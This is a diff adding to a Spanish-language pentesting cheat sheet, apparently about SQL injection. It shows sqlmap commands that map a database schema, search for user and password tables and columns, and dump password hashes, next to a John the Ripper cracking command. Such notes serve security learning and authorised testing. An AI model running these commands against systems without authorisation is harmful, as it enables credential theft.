@@ -341,6 +341,27 @@ Si devuelve información inesperada, es probable que sea vulnerable. 🔥
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```
+#### Otros escaneos con SQLmap
+
+##### 📌 Ver toda la estructura de la Base de Datos  
+```bash
+sqlmap -r consulta.req --schema
+```
+
+##### 🔍 Buscar una palabra clave en Tablas  
+```bash
+sqlmap -r consulta.req --search -T user
+```
+
+##### 🔍 Buscar una palabra clave en Columnas  
+```bash
+sqlmap -r consulta.req --search -C pass
+```
+
+##### 🔑 Descifrar contraseñas  
+```bash
+sqlmap -r consulta.req --passwords --batch
+```
 #### 🛠️ Banderas útiles de SQLmap
 
 ##### 1. **`-u` o `--url`** 🌐
